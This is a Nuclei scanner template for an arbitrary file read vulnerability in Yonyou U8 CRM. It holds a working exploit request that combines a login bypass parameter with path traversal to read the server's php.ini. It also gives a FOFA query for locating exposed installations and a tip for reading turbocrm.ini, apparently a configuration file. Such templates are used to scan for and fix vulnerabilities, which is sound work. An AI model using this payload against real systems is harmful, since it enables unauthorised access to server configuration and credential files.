id: yonyou-u8-crm-downloadfile-fileread

info:
  name: 用友 U8 CRM downloadfile.php - fileread
  author: cnaq  
  severity: high 
  description: 用友U8-CRM客户关系管理系统downloadfile.php存在任意文件读取漏洞
  reference: 
    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BU8-CRM%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fdownloadfile.php%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    fofa-query: app="用友U8CRM"
    tips: also can read /datacache/../../../tsvr/turbocrm.ini
  tags: yonyou,u8crm,oa,fileread

http:
  - method: GET
    path:
      - "{{BaseURL}}/pub/downloadfile.php?DontCheckLogin=1&url=/datacache/../../../apache/php.ini"
      
    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - '200'
      - type: regex
        part: body
        regex:
          - 'About PHP'